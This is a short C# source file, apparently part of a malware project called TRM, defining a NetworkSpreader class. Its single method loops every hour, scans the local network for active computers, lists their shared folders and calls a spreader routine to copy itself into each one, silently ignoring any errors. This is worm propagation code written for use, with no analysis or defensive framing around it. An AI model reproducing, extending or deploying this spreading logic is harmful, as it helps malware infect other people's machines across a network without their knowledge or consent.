using System.Collections.Generic;
using System.Threading;
using TRM.Spread;

namespace TRM.Network;

public class NetworkSpreader
{
	public static readonly int DelayBetweenChecks = 3600000;

	public static void StartNetworkSpreadProcess()
	{
		do
		{
			List<string> iplist = AvailablePcDetector.FindActiveComputerInNetwork();
			List<string> list = AvailablePcDetector.FindShares(iplist);
			try
			{
				foreach (string item in list)
				{
					Spreader.SpreadIntoFolder(item);
				}
			}
			catch
			{
			}
			Thread.Sleep(DelayBetweenChecks);
		}
		while (AppConfig.AppIsRunning);
	}
}
